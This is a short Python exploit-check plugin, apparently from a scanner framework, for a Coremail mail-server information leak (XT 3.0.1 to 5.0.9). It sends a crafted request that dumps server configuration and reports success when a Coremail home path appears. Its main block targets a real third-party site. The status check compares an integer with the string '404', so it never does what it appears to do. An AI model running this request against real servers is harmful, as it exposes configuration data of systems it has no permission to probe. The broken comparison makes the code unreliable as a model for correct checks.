#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Coremail_Information_Leak_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': '论客邮箱信息泄露漏洞',
            'description': '论客邮箱信息泄露漏洞,影响范围为: Coremail XT 3.0.1至XT 5.0.9版本',
            'date': '2019-05-22',
            'exptype': 'check',
            'type': 'Info'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            req = request.get(self.url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/", headers = self.headers)
            if req.status_code != '404' and '/home/coremail' in req.text:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    Coremail_Information_Leak = Coremail_Information_Leak_BaseVerify('http://www.baidu.com')
    Coremail_Information_Leak.check()
